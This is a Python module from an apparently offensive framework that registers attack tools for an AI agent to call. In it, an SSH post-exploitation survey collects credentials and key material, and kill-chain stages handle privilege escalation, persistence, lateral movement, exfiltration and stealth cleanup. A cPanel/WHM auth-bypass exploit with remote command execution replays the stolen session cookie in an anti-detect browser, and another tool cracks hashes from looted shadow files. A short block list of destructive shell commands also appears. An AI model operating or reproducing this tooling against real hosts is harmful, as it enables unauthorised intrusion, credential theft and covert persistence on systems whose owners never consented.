#!/usr/bin/env python3
"""
Post-exploitation tools: SSH sessions, kill chain stages, WAF detect, Shodan, hash cracking.
Extracted from tools.py.
"""

import os
import logging
import re
import concurrent.futures

from core.tools.base import (
    run_tool, is_tool_available, get_tool_config,
    C_GREY, C_RESET, C_CYAN, C_GREEN, C_YELLOW, C_RED,
)
from core.tools.exploit_tools import (
    register_credential, get_best_creds_for_target,
)
from core.tools.recon_tools import (
    run_nmap, run_whois, run_whatweb, run_curl_headers,
    run_dig, run_sslscan, run_ffuf, run_enum4linux,
    run_smbclient, run_wpscan, run_sqlmap, run_nikto,
    run_scrapling_fetch, run_ssh_user_enum,
)

_PIVOT_SSH_CLIENTS = []


def _clip_ssh_output(text: str, max_chars: int = 2500) -> str:
    """Keep SSH analysis output useful for AI context without flooding it."""
    if not text:
        return "(no output)"
    text = text.strip()
    if len(text) <= max_chars:
        return text
    return text[:max_chars].rstrip() + f"\n[... truncated {len(text) - max_chars} chars ...]"


def _ssh_analyze(host: str, user: str, pwd: str, port: int = 22) -> str:
    """Run a compact, read-only SSH post-exploitation survey.

    This replaces the old ssh_session.py dependency with the shared killchain SSH
    helpers, so cached credentials can flow back into the tool registry.
    """
    if not host or not user or not pwd:
        return "[!] SSH analysis requires host, user and password."

    try:
        from core.killchain.ssh_helpers import _ssh_connect, _ssh_exec
    except ImportError as e:
        return f"[!] SSH helpers unavailable: {e}"

    client = None
    try:
        client, err = _ssh_connect(host, user, pwd, port=port, timeout=15)
        if err or client is None:
            return f"[!] SSH connection failed: {err or 'unknown error'}"

        register_credential("ssh", host, user, pwd)

        lines = [
            f"[*] SSH Post-Exploitation Analysis: {user}@{host}:{port}",
            f"[+] SSH connected as {user}@{host}",
            f"Known: {user}:{pwd}",
        ]

        checks = [
            ("System", "uname -a", 8),
            ("Identity", "id; whoami", 8),
            ("Hostname", "hostname; hostname -f 2>/dev/null || true", 8),
            ("OS release", "cat /etc/os-release 2>/dev/null | head -20", 8),
            ("Kernel", "uname -r", 8),
            ("Network addresses", "ip -o addr show 2>/dev/null | head -80 || ifconfig -a 2>/dev/null | head -120", 10),
            ("Listening services", "ss -tulpen 2>/dev/null | head -120 || netstat -tulpen 2>/dev/null | head -120", 10),
            ("Interactive users", "awk -F: '$7 !~ /(nologin|false)$/ {print $1\":\"$3\":\"$6\":\"$7}' /etc/passwd 2>/dev/null | head -80", 8),
            ("Sudo rights", "sudo -n -l 2>/dev/null || true", 8),
            ("SUID binaries", "find / -perm -4000 -type f 2>/dev/null | head -80", 15),
            ("Writable temp dirs", "find /tmp /var/tmp /dev/shm -maxdepth 1 -writable -type d 2>/dev/null | head -80", 8),
            ("Home directories", "ls -la /home 2>/dev/null; ls -la /root 2>/dev/null | head -40", 8),
            ("SSH material", "find ~/.ssh /home -maxdepth 3 -type f 2>/dev/null | head -80", 10),
            ("Environment", "env 2>/dev/null | sort | head -80", 8),
            ("Interesting files", "find /var/www /srv /opt -maxdepth 3 -type f 2>/dev/null | head -120", 12),
        ]

        for label, command, timeout in checks:
            out = _ssh_exec(client, command, timeout=timeout)
            status = "-" if out.startswith("[!]") else "+"
            lines.append("")
            lines.append(f"[{status}] {label}")
            lines.append(f"$ {command}")
            lines.append(_clip_ssh_output(out))

        return "\n".join(lines)
    finally:
        if client is not None:
            try:
                client.close()
            except Exception as _exc:
                logging.debug(f"Suppressed in post_tools.py: {_exc}")


def _ssh_exec_block_reason(command: str) -> str:
    """Return a reason when a remote command is too destructive for ssh_exec."""
    cmd = (command or "").strip()
    if not cmd:
        return "empty command"
    lowered = cmd.lower()
    blocked_patterns = [
        (r'(^|[;&|]\s*)rm\s+-[^\n]*r[^\n]*\s+/(?:\s|$)', "recursive delete from filesystem root"),
        (r'(^|[;&|]\s*)(mkfs|shutdown|reboot|poweroff)\b', "destructive system command"),
        (r'(^|[;&|]\s*)init\s+[06]\b', "destructive runlevel change"),
        (r'\bdd\s+.*\bof=/dev/', "raw block-device write"),
        (r':\s*\(\s*\)\s*\{', "fork-bomb pattern"),
    ]
    for pattern, reason in blocked_patterns:
        if re.search(pattern, lowered):
            return reason
    return ""


def _strip_wrapping_quotes(value: str) -> str:
    value = (value or "").strip()
    if len(value) >= 2 and value[0] == value[-1] and value[0] in ("'", '"'):
        return value[1:-1]
    return value



def _run_ssh_session_interactive(target: str) -> str:
    """Interactive SSH session — prompts for creds if not already known."""
    # Check if we already have creds for this target
    known = get_best_creds_for_target(target)
    if known[0] and known[1]:
        print(f"  \033[92m[+] Using cached credentials: {known[0]}@{target}\033[0m")
        use_cached = input(f"  Use cached creds {known[0]}:****? [Y/n]: ").strip().lower()
        if use_cached != 'n':
            return _ssh_analyze(target, known[0], known[1])
    user = input(f"  SSH Username for {target}: ").strip() or "root"
    pwd  = input(f"  SSH Password for {target}: ").strip()
    if not pwd:
        return "[!] No password provided."
    # Register creds for reuse
    register_credential("ssh", target, user, pwd)
    return _ssh_analyze(target, user, pwd)


def _run_killchain_stage(stage: str, target: str) -> str:
    """Run a kill chain stage that doesn't need credentials."""
    try:
        from core.killchain import vuln_assess, auto_exploit
        if stage == "vuln_assess":
            return vuln_assess(target)
        elif stage == "auto_exploit":
            return auto_exploit(target)
    except ImportError:
        return "[!] core.killchain package not found."
    return "[!] Unknown stage."


def _run_killchain_interactive(stage: str, target: str) -> str:
    """Run a kill chain stage that needs SSH credentials."""
    try:
        from core.killchain import (
            data_exfil,
            lateral_move,
            plant_persistence,
            run_full_killchain,
            run_privesc,
            stealth_cleanup,
        )
    except ImportError:
        return "[!] core.killchain package not found."

    # Check if we already have creds for this target
    known = get_best_creds_for_target(target)
    if known[0] and known[1]:
        print(f"  \033[92m[+] Using cached credentials: {known[0]}@{target}\033[0m")
        use_cached = input(f"  Use cached creds {known[0]}:****? [Y/n]: ").strip().lower()
        if use_cached != 'n':
            user, pwd = known
        else:
            user = input(f"  SSH Username for {target}: ").strip() or "root"
            pwd  = input(f"  SSH Password for {target}: ").strip()
            if not pwd:
                return "[!] No password provided."
            register_credential("ssh", target, user, pwd)
    else:
        user = input(f"  SSH Username for {target}: ").strip() or "root"
        pwd  = input(f"  SSH Password for {target}: ").strip()
        if not pwd:
            return "[!] No password provided."
        # Register creds for reuse by AI and other stages
        register_credential("ssh", target, user, pwd)

    if stage == "privesc":
        return run_privesc(target, user, pwd)
    elif stage == "persist":
        return plant_persistence(target, user, pwd)
    elif stage == "lateral":
        return lateral_move(target, user, pwd)
    elif stage == "exfil":
        return data_exfil(target, user, pwd)
    elif stage == "full":
        return run_full_killchain(target, user, pwd)
    elif stage == "cleanup":
        return stealth_cleanup(target, user, pwd)
    return "[!] Unknown kill chain stage."


def _run_waf_detect(target: str) -> str:
    """Detect WAF/firewall on target."""
    try:
        from evasion import WebEvasionSession
        ws = WebEvasionSession()
        result = ws.detect_waf(f"http://{target}")
        out = f"[WAF DETECTION — {target}]\n"
        out += f"WAF Detected: {result['waf_detected']}\n"
        out += f"WAF Type: {result['waf_type']}\n"
        for d in result.get('details', []):
            out += f"  → {d}\n"
        return out
    except ImportError:
        return "[!] evasion.py not found."


# ── v8.0: SHODAN MENU HELPERS ──────────────────────────

def _run_shodan_interactive(target: str) -> str:
    """Interactive Shodan search from menu."""
    try:
        from shodan_module import run_shodan_interactive
        return run_shodan_interactive(target)
    except ImportError:
        return "[!] shodan_module.py not found. pip install shodan"

def _run_shodan_host(target: str) -> str:
    """Shodan host lookup from menu."""
    try:
        from shodan_module import run_shodan_host
        return run_shodan_host(target)
    except ImportError:
        return "[!] shodan_module.py not found."

def _run_shodan_vulns(target: str) -> str:
    """Shodan CVE lookup from menu."""
    try:
        from shodan_module import run_shodan_vulns
        return run_shodan_vulns(target)
    except ImportError:
        return "[!] shodan_module.py not found."

def _run_shodan_range(target: str) -> str:
    """Shodan range/subnet scan from menu."""
    try:
        from shodan_module import run_shodan_range
        # Auto-generate CIDR from target IP if single IP
        import re as _re
        if _re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target.strip()):
            # Single IP — suggest /24
            subnet = '.'.join(target.split('.')[:3]) + '.0/24'
            cidr = input(f"  CIDR range [{subnet}]: ").strip() or subnet
        else:
            cidr = input(f"  CIDR range (e.g. 83.166.241.0/24): ").strip()
        if cidr:
            return run_shodan_range(cidr)
        return "[!] No CIDR provided."
    except ImportError:
        return "[!] shodan_module.py not found."

def _run_crack_hashes(target: str) -> str:
    """Hash cracking from menu — auto-detects shadow files from loot."""
    try:
        from hash_cracker import run_crack_hashes
        if os.path.isfile(target):
            return run_crack_hashes(target)
        # v8.1: Auto-detect shadow files from loot
        loot_dir = os.path.expanduser(f"~/OCTOPUS/loot/{target.replace('.', '_')}")
        auto_files = []
        for search_dir in [loot_dir, "/tmp"]:
            if os.path.isdir(search_dir):
                for f in os.listdir(search_dir):
                    if "shadow" in f.lower() or f.endswith(".hash"):
                        auto_files.append(os.path.join(search_dir, f))
        if auto_files:
            print(f"  Found shadow/hash files:")
            for i, f in enumerate(auto_files, 1):
                print(f"    [{i}] {f}")
            choice = input(f"  Select file # or paste path: ").strip()
            if choice.isdigit() and 1 <= int(choice) <= len(auto_files):
                return run_crack_hashes(auto_files[int(choice) - 1])
            elif os.path.isfile(choice):
                return run_crack_hashes(choice)
        # Fallback: prompt
        path = input(f"  Shadow file path (or paste hashes): ").strip()
        if path:
            return run_crack_hashes(path)
        return "[!] No input provided."
    except ImportError:
        return "[!] hash_cracker.py not found."


# ─────────────────────────────────────────────
# MAIN RECON PIPELINE
# ─────────────────────────────────────────────

def run_default_recon(target: str) -> dict:
    """
    Run the standard recon pipeline CONCURRENTLY.
    Returns a dict of {tool_name: output_string}.
    Now includes scrapling for web targets.
    v8.0: Adds optional Shodan enrichment.
    """
    print(f"\n[*] Starting concurrent recon on: {target}")
    print("\u2500" * 50)

    # We select the fast/standard tools for the default run
    default_tools = {
        "nmap":         run_nmap,
        "whois":        run_whois,
        "whatweb":      run_whatweb,
        "curl_headers": run_curl_headers,
        "dig":          run_dig,
        "sslscan":      run_sslscan,
        "ffuf":         run_ffuf,
        "enum4linux":   run_enum4linux,
        "smbclient":    run_smbclient,
    }

    results = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=len(default_tools)) as executor:
        future_to_name = {executor.submit(func, target): key for key, func in default_tools.items()}
        for future in concurrent.futures.as_completed(future_to_name):
            tool_name = future_to_name[future]
            try:
                data = future.result()
            except Exception as exc:
                data = f"[!] {tool_name} generated an exception: {exc}"
            results[tool_name] = data

    # v8.0: Shodan enrichment (non-blocking — skips if no API key)
    try:
        from shodan_module import run_shodan_host
        import re as _re
        if _re.match(r'^\d+\.\d+\.\d+\.\d+$', target.strip()):
            shodan_data = run_shodan_host(target)
            if shodan_data and "[!]" not in shodan_data[:10]:
                results["shodan"] = shodan_data
    except Exception as e:
        pass  # Shodan not available — that's fine

    print("─" * 50)
    print("[+] Recon complete.\n")
    return results


def _verify_cpanel_in_browser(target: str, port: int, token: str, session: str) -> str:
    """Open cPanel dashboard in ShardBrowser with stolen session cookie."""
    try:
        from core.osint.shardbrowser import ShardBrowser
    except ImportError:
        return "  [!] ShardBrowser not available — cannot verify in browser."

    sb = ShardBrowser()
    status = sb.get_status()
    if not status.get("installed"):
        return f"  [!] ShardBrowser not ready: {status.get('error', '')}"

    # Build authenticated URL (WHM dashboard)
    base_url = f"https://{target}:{port}"
    dashboard_url = f"{base_url}{token}/scripts2/listaccts"
    api_url = f"{base_url}{token}/json-api/version"

    # Cookie for cPanel/WHM
    domain = target.strip()
    cookies = [
        {
            "name": "whostmgrsession",
            "value": session,
            "domain": domain,
            "path": "/",
            "httpOnly": True,
            "secure": True,
            "sameSite": "Lax",
        },
        {
            "name": "whostmgrrelogin",
            "value": "no",
            "domain": domain,
            "path": "/",
            "secure": True,
            "sameSite": "Lax",
        },
    ]

    import os, re, time

    screenshot_dir = os.path.join(
        os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
        "data", "screenshots"
    )
    os.makedirs(screenshot_dir, exist_ok=True)
    ts = int(time.time())
    screenshot_path = os.path.join(screenshot_dir, f"cpanel_{target}_{ts}.png")

    lines = []
    lines.append(f"")
    lines.append(f"  ╔══════════════════════════════════════════════════╗")
    lines.append(f"  ║  ShardX — cPanel Session Verification            ║")
    lines.append(f"  ╚══════════════════════════════════════════════════╝")
    lines.append(f"")

    # Step 1: Verify API access
    print(f"  [*] Step 1: Verifying API access via {api_url[:60]}...")
    try:
        api_result = sb.browse_with_cookies(
            api_url, cookies, headless=True, wait=3,
        )
        api_content = api_result.get("content", "")
        api_title = api_result.get("title", "")

        # Parse version from JSON API response
        import json as _json
        version_match = re.search(r'"version"\s*:\s*"([^"]+)"', api_content)
        if version_match:
            lines.append(f"  ✅ API verified — cPanel version: {version_match.group(1)}")
        elif api_result.get("status_code") == 200:
            lines.append(f"  ✅ API responded (HTTP {api_result.get('status_code')})")
        else:
            lines.append(f"  ⚠️  API status: HTTP {api_result.get('status_code', '?')}")

    except Exception as e:
        lines.append(f"  ⚠️  API check failed: {e}")
        api_content = ""

    # Step 2: Browse WHM dashboard
    print(f"  [*] Step 2: Opening WHM dashboard...")
    try:
        dash_result = sb.browse_with_cookies(
            dashboard_url, cookies, headless=True,
            screenshot_path=screenshot_path, wait=5,
        )
        content = dash_result.get("content", "")
        title = dash_result.get("title", "")

        lines.append(f"  Dashboard: {dash_result.get('url_final', dashboard_url)}")
        lines.append(f"  Title:     {title[:80] if title else '(empty)'}")
        lines.append(f"  Size:      {len(content)} bytes")
        lines.append(f"  HTTP:      {dash_result.get('status_code', '?')}")

        if os.path.isfile(screenshot_path):
            lines.append(f"  Screenshot: {screenshot_path}")

        # Extract account list from WHM listaccts page
        accounts = re.findall(r'<td[^>]*class="[^"]*cell[^"]*"[^>]*>\s*(\S+@\S+|\w+)\s*</td>', content)
        if not accounts:
            accounts = re.findall(r'acct\[\d+\]\s*=\s*\{[^}]*"user"\s*:\s*"([^"]+)"', content)
        if not accounts:
            accounts = re.findall(r'"user"\s*:\s*"([^"]+)"', content)

        unique_accounts = list(dict.fromkeys(accounts))[:30]
        if unique_accounts:
            lines.append(f"")
            lines.append(f"  ─── ACCOUNTS FOUND ({len(unique_accounts)}) ───")
            for acc in unique_accounts:
                lines.append(f"    • {acc}")

        # Extract hostname
        hostname_m = re.search(r'hostname["\s:]+([a-zA-Z0-9._-]+)', content, re.IGNORECASE)
        if hostname_m:
            lines.append(f"  Hostname: {hostname_m.group(1)}")

        # Extract navigation links (WHM panel sections)
        nav_links = re.findall(r'href="(/cpsess\d+/[^"]+)"[^>]*>\s*([^<]+)', content)
        if nav_links:
            lines.append(f"")
            lines.append(f"  ─── WHM PANEL SECTIONS ───")
            seen = set()
            for href, text in nav_links[:25]:
                text = text.strip()
                if text and text not in seen and len(text) > 2:
                    seen.add(text)
                    lines.append(f"    → {text[:40]:40s}  {base_url}{href[:60]}")

        # Extract cookies for persistence
        if dash_result.get("cookies_after"):
            lines.append(f"")
            lines.append(f"  ─── SESSION COOKIES ───")
            for c in dash_result["cookies_after"][:10]:
                lines.append(f"    {c['name']:25s} = {c['value']}")

        lines.append(f"")
        lines.append(f"  ✅ BROWSER VERIFICATION COMPLETE")

        # Extract text summary for AI
        text = re.sub(r'<script[^>]*>.*?</script>', '', content, flags=re.DOTALL)
        text = re.sub(r'<style[^>]*>.*?</style>', '', text, flags=re.DOTALL)
        text = re.sub(r'<[^>]+>', ' ', text)
        text = re.sub(r'\s+', ' ', text).strip()
        if len(text) > 200:
            lines.append(f"")
            lines.append(f"  ─── PAGE TEXT (first 2000 chars) ───")
            for i in range(0, min(len(text), 2000), 120):
                lines.append(f"  {text[i:i+120]}")

    except Exception as e:
        lines.append(f"  [!] Dashboard browse failed: {e}")

    return "\n".join(lines)


def _run_cpanel_exploit(target: str) -> str:
    """Interactive cPanel CVE-2026-41940 exploit from menu."""
    try:
        from modules.exploits.cpanel_auth_bypass import CpanelSniper
    except ImportError:
        return "[!] cpanel_auth_bypass module not found."

    port_str = input(f"  Port [2087]: ").strip() or "2087"
    port = int(port_str)
    mode = input("  Mode — [1] Check only  [2] Full exploit (default): ").strip() or "2"

    sniper = CpanelSniper()

    if mode == "1":
        result = sniper.scan(f"{target}:{port}")
    else:
        rce_cmd = input("  RCE command [id]: ").strip() or "id"
        result = sniper.exec_cmd(f"{target}:{port}", cmd=rce_cmd)

    # ── Build structured output ──
    lines = []
    lines.append(f"╔══════════════════════════════════════════════════╗")
    lines.append(f"║  CVE-2026-41940 — cPanel/WHM Auth Bypass         ║")
    lines.append(f"╚══════════════════════════════════════════════════╝")
    lines.append(f"")
    lines.append(f"  Target:   https://{target}:{port}")
    lines.append(f"  Status:   {result.get('status', 'unknown').upper()}")

    if result.get("token"):
        lines.append(f"  Token:    {result['token']}")
    if result.get("session"):
        lines.append(f"  Session:  {result['session']}")
    if result.get("version"):
        lines.append(f"  Version:  {result['version']}")
    if result.get("api_url"):
        lines.append(f"  API URL:  {result['api_url']}")
    if result.get("hostname"):
        lines.append(f"  Hostname: {result['hostname']}")

    lines.append(f"  Elapsed:  {result.get('elapsed_s', '?')}s")
    lines.append(f"  Exit:     {result.get('exit_code', '?')}")

    if result.get("cmd_output"):
        lines.append(f"")
        lines.append(f"  ─── COMMAND OUTPUT ───")
        for ln in result["cmd_output"].splitlines():
            lines.append(f"  {ln}")

    if result.get("accounts"):
        lines.append(f"")
        lines.append(f"  ─── ACCOUNTS ({len(result['accounts'])}) ───")
        for acc in result["accounts"][:20]:
            lines.append(f"  {acc['user']:20s} {acc['domain']}")

    if result.get("status") == "vulnerable":
        lines.append(f"")
        lines.append(f"  ✅ TARGET IS VULNERABLE — authenticated session obtained")
        if result.get("token") and result.get("session"):
            api = f"https://{target}:{port}{result['token']}/json-api/version"
            lines.append(f"  cPanel API:  {api}")
            lines.append(f"  Cookie:      whostmgrsession={result['session']}")

        # ── Offer browser verification ──
        if result.get("token") and result.get("session"):
            lines.append(f"")
            # Print what we have so far
            print("\n".join(lines))
            lines.clear()

            verify = input("\n  [?] Open cPanel dashboard in ShardBrowser to verify? [Y/n]: ").strip().lower()
            if verify != "n":
                browser_result = _verify_cpanel_in_browser(
                    target, port, result["token"], result["session"]
                )
                lines.append(browser_result)
            else:
                lines.append("")

    raw = result.get("raw_output", "")
    if raw:
        lines.append(f"")
        lines.append(f"  ─── RAW BINARY OUTPUT ───")
        for ln in raw.splitlines()[:50]:
            lines.append(f"  {ln}")

    return "\n".join(lines)


def _run_shardbrowser_osint(target: str) -> str:
    """Interactive ShardBrowser — direct navigation or OSINT search."""
    try:
        from core.osint.shardbrowser import ShardBrowser
    except ImportError:
        return "[!] ShardBrowser module not found."

    sb = ShardBrowser()
    status = sb.get_status()
    if not status.get("installed"):
        return (f"[!] ShardBrowser not ready: {status.get('error', 'unknown')}\n"
                "Install deps: pip install httpx[socks] patchright")

    import re as _re

    # Detect if target is IP/URL (navigate directly) vs search query (OSINT search)
    is_ip_or_url = bool(_re.match(
        r'^(\d{1,3}\.){3}\d{1,3}(:\d+)?$|^https?://|^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(:\d+)?(/.*)?$',
        target.strip()
    ))

    if is_ip_or_url:
        # Default: direct navigation mode
        print(f"  [*] Target is IP/URL — using direct navigation (not search)")
        mode = input(f"  Mode — [1] Direct browse (default)  [2] OSINT search: ").strip() or "1"
    else:
        mode = "2"

    if mode == "1":
        # ── Direct navigation: open target in anti-detect browser ──
        proto = input(f"  Protocol [https]: ").strip() or "https"
        port_in = input(f"  Port [auto]: ").strip()

        # Build URL
        t = target.strip()
        if not t.startswith("http"):
            if port_in:
                url = f"{proto}://{t}:{port_in}"
            else:
                url = f"{proto}://{t}"
        else:
            url = t

        print(f"  [*] Navigating to: {url}")

        session = None
        try:
            session = sb.launch_profile(
                platform="Windows", headless=True, randomize=True,
            )

            import asyncio
            try:
                loop = asyncio.get_running_loop()
            except RuntimeError:
                loop = None

            if loop and loop.is_running():
                # Already in async context — use new loop in thread
                import concurrent.futures
                with concurrent.futures.ThreadPoolExecutor() as pool:
                    content = pool.submit(
                        asyncio.run,
                        sb._browse_async(session.cdp_url, url, wait=5)
                    ).result(timeout=30)
            else:
                content = asyncio.run(
                    sb._browse_async(session.cdp_url, url, wait=5)
                )

            # Extract useful info from page
            lines = []
            lines.append(f"╔══════════════════════════════════════════════════╗")
            lines.append(f"║  ShardX Direct Browse — {url[:40]:<40s} ║")
            lines.append(f"╚══════════════════════════════════════════════════╝")
            lines.append(f"")
            lines.append(f"  URL:            {url}")
            lines.append(f"  Content size:   {len(content)} bytes")

            # Extract title
            import re
            title_m = re.search(r'<title[^>]*>(.*?)</title>', content, re.DOTALL | re.IGNORECASE)
            if title_m:
                lines.append(f"  Page title:     {title_m.group(1).strip()[:100]}")

            # Extract headers from meta tags
            metas = re.findall(r'<meta\s+[^>]*name=["\']([^"\']+)["\'][^>]*content=["\']([^"\']+)["\']',
                               content, re.IGNORECASE)
            if metas:
                lines.append(f"  Meta tags:")
                for name, val in metas[:10]:
                    lines.append(f"    {name}: {val[:80]}")

            # Extract links
            hrefs = re.findall(r'href=["\']([^"\']+)["\']', content)
            unique_hrefs = list(dict.fromkeys(hrefs))[:20]
            if unique_hrefs:
                lines.append(f"  Links ({len(hrefs)} total, showing {len(unique_hrefs)}):")
                for h in unique_hrefs:
                    lines.append(f"    → {h[:120]}")

            # Extract forms (login forms, etc.)
            forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>', content, re.IGNORECASE)
            if forms:
                lines.append(f"  Forms:")
                for f in forms[:5]:
                    lines.append(f"    POST → {f}")

            # Extract input fields (credential fields)
            inputs = re.findall(r'<input[^>]*type=["\']?(password|text|email)["\']?[^>]*name=["\']([^"\']+)["\']',
                                content, re.IGNORECASE)
            if inputs:
                lines.append(f"  Input fields:")
                for itype, iname in inputs[:10]:
                    lines.append(f"    [{itype}] {iname}")

            # Server headers from content clues
            server_m = re.search(r'[Ss]erver:\s*([^\r\n]+)', content)
            poweredby = re.search(r'[Xx]-[Pp]owered-[Bb]y:\s*([^\r\n]+)', content)
            if server_m:
                lines.append(f"  Server:         {server_m.group(1)}")
            if poweredby:
                lines.append(f"  X-Powered-By:   {poweredby.group(1)}")

            lines.append(f"")
            lines.append(f"  ─── PAGE CONTENT (first 3000 chars) ───")
            # Strip HTML tags for readable text
            text = re.sub(r'<script[^>]*>.*?</script>', '', content, flags=re.DOTALL)
            text = re.sub(r'<style[^>]*>.*?</style>', '', text, flags=re.DOTALL)
            text = re.sub(r'<[^>]+>', ' ', text)
            text = re.sub(r'\s+', ' ', text).strip()
            for i in range(0, min(len(text), 3000), 120):
                lines.append(f"  {text[i:i+120]}")

            return "\n".join(lines)

        except Exception as e:
            return f"[!] ShardX browse failed: {e}"
        finally:
            if session:
                try:
                    session.stop()
                except Exception as _exc:
                    logging.debug(f"Suppressed in post_tools.py: {_exc}")
    else:
        # ── OSINT search mode ──
        query = input(f"  Search query [{target}]: ").strip() or target
        engines_str = input("  Engines [google,bing,duckduckgo]: ").strip()
        engines = [e.strip() for e in engines_str.split(",")] if engines_str else None
        results = sb.osint_target(query, engines=engines)
        import json as _json
        return f"[ShardX OSINT Search — {query}]\n" + _json.dumps(results, indent=2, default=str)



# ── AI FACING WRAPPERS FOR REGISTRY ─────────────────────

from core.tools.registry import tool

def _resolve_ai_creds(host: str, user: str = None, pwd: str = None) -> tuple:
    cached_user, cached_pwd = get_best_creds_for_target(host)
    if user and pwd:
        return (user, pwd)
    if cached_user and cached_pwd:
        return (cached_user, cached_pwd)
    return (None, None)


def _resolve_ad_creds(target: str, user: str = None, pwd: str = None,
                      domain: str = "", nthash: str = "") -> dict:
    if user or pwd or domain or nthash:
        return {
            "user": user or "",
            "username": user or "",
            "password": pwd or "",
            "domain": domain or "",
            "nthash": nthash or "",
            "service": "ldap",
            "port": 389,
        }

    cached_user, cached_pwd = get_best_creds_for_target(target, "ldap")
    if not cached_user:
        cached_user, cached_pwd = get_best_creds_for_target(target, "ssh")
    return {
        "user": cached_user or "",
        "username": cached_user or "",
        "password": cached_pwd or "",
        "domain": domain or "",
        "nthash": nthash or "",
        "service": "ldap" if cached_user else "",
        "port": 389 if cached_user else 0,
    }


def _connect_ssh_for_tool(host: str, user: str = None, pwd: str = None, port: int = 22):
    user, pwd = _resolve_ai_creds(host, user, pwd)
    if not user or not pwd:
        return None, None, None, f"[!] SSH credentials required for {host}."
    try:
        from core.killchain.ssh_helpers import _ssh_connect
    except ImportError as e:
        return None, user, pwd, f"[!] SSH helpers unavailable: {e}"
    client, err = _ssh_connect(host, user, pwd, port=port, timeout=15)
    if err or client is None:
        return None, user, pwd, f"[!] SSH connection failed: {err or 'unknown error'}"
    register_credential("ssh", host, user, pwd)
    return client, user, pwd, ""


def _write_generated_artifact(filename: str, content: str) -> str:
    base_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    out_dir = os.path.join(base_dir, "data", "generated")
    os.makedirs(out_dir, exist_ok=True)
    path = os.path.join(out_dir, filename)
    with open(path, "w") as fh:
        fh.write(content)
    return path


def _build_browser_url(target: str, proto: str = "https", port: str = "") -> str:
    target = (target or "").strip()
    proto = (proto or "https").strip().replace("://", "")
    port = str(port or "").strip()
    if target.startswith(("http://", "https://")):
        return target
    if port:
        return f"{proto}://{target}:{port}"
    return f"{proto}://{target}"


def _summarize_browser_content(url: str, content: str) -> str:
    """Extract compact web intelligence from browser-rendered HTML."""
    lines = [
        f"[ShardX Direct Browse - {url}]",
        f"URL: {url}",
        f"Content size: {len(content or '')} bytes",
    ]

    title_m = re.search(r'<title[^>]*>(.*?)</title>', content or "", re.DOTALL | re.IGNORECASE)
    if title_m:
        title = re.sub(r'\s+', ' ', title_m.group(1)).strip()
        lines.append(f"Page title: {title[:160]}")

    metas = re.findall(
        r'<meta\s+[^>]*name=["\']([^"\']+)["\'][^>]*content=["\']([^"\']+)["\']',
        content or "",
        re.IGNORECASE,
    )
    if metas:
        lines.append("Meta tags:")
        for name, val in metas[:12]:
            clean_val = re.sub(r'\s+', ' ', val).strip()
            lines.append(f"  {name}: {clean_val[:140]}")

    hrefs = re.findall(r'href=["\']([^"\']+)["\']', content or "", re.IGNORECASE)
    unique_hrefs = list(dict.fromkeys(hrefs))
    if unique_hrefs:
        lines.append(f"Links: {len(hrefs)} total, {len(unique_hrefs)} unique")
        for href in unique_hrefs[:25]:
            lines.append(f"  link: {href[:180]}")

    forms = re.findall(r'<form[^>]*?(?:action=["\']([^"\']*)["\'])?[^>]*>', content or "", re.IGNORECASE)
    if forms:
        lines.append(f"Forms: {len(forms)}")
        for action in forms[:10]:
            lines.append(f"  form_action: {action or '(current page)'}")

    inputs = re.findall(
        r'<input[^>]*type=["\']?([^"\'\s>]+)["\']?[^>]*name=["\']([^"\']+)["\']',
        content or "",
        re.IGNORECASE,
    )
    if inputs:
        lines.append(f"Input fields: {len(inputs)}")
        for itype, iname in inputs[:20]:
            lines.append(f"  input: {itype}:{iname}")

    text = re.sub(r'<script[^>]*>.*?</script>', '', content or "", flags=re.DOTALL | re.IGNORECASE)
    text = re.sub(r'<style[^>]*>.*?</style>', '', text, flags=re.DOTALL | re.IGNORECASE)
    text = re.sub(r'<[^>]+>', ' ', text)
    text = re.sub(r'\s+', ' ', text).strip()
    if text:
        lines.append("Visible text:")
        lines.append(text[:2000])

    return "\n".join(lines)


def _run_shardbrowser_direct(target: str, proto: str = "https", port: str = "",
                             wait: float = 5, headless: bool = True) -> str:
    try:
        from core.osint.shardbrowser import ShardBrowser
    except ImportError:
        return "[!] ShardBrowser module not found."

    sb = ShardBrowser()
    status = sb.get_status()
    if not status.get("installed"):
        return (f"[!] ShardBrowser not ready: {status.get('error', 'unknown')}\n"
                "Install deps: pip install httpx[socks] patchright")

    url = _build_browser_url(target, proto=proto, port=port)
    session = None
    try:
        session = sb.launch_profile(platform="Windows", headless=headless, randomize=True)
        content = sb.browse_sync(session, url, wait=float(wait))
        return _summarize_browser_content(url, content)
    except Exception as e:
        return f"[!] ShardX browse failed: {e}"
    finally:
        if session:
            try:
                session.stop()
            except Exception as _exc:
                logging.debug(f"Suppressed in post_tools.py: {_exc}")



@tool(name="killchain_vuln_assess", aliases=["killchain_vuln", "vuln_assess"], category="post", description="Killchain Vulnerability Assessment")
def ai_vuln_assess(target_ip: str, recon_data: str = "") -> str:
    from core.killchain import vuln_assess
    return vuln_assess(target_ip, recon_data)

@tool(name="killchain_exploit", aliases=["auto_exploit"], category="post", description="Killchain Auto Exploit")
def ai_auto_exploit(target_ip: str, recon_data: str = "") -> str:
    from core.killchain import auto_exploit
    return auto_exploit(target_ip, recon_data)

@tool(name="killchain_privesc", aliases=["privesc"], category="post", description="Killchain Privilege Escalation", requires=["python:paramiko"])
def ai_privesc(target_ip: str, user: str = None, pwd: str = None) -> str:
    user, pwd = _resolve_ai_creds(target_ip, user, pwd)
    from core.killchain import run_privesc
    return run_privesc(target_ip, user, pwd)

@tool(name="killchain_persist", aliases=["persist", "persistence"], category="post", description="Killchain Persistence", requires=["python:paramiko"])
def ai_persist(target_ip: str, user: str = None, pwd: str = None) -> str:
    user, pwd = _resolve_ai_creds(target_ip, user, pwd)
    from core.killchain import plant_persistence
    return plant_persistence(target_ip, user, pwd)

@tool(name="killchain_lateral", aliases=["lateral_move", "lateral"], category="post", description="Killchain Lateral Movement", requires=["python:paramiko"])
def ai_lateral(target_ip: str, user: str = None, pwd: str = None) -> str:
    user, pwd = _resolve_ai_creds(target_ip, user, pwd)
    from core.killchain import lateral_move
    return lateral_move(target_ip, user, pwd)

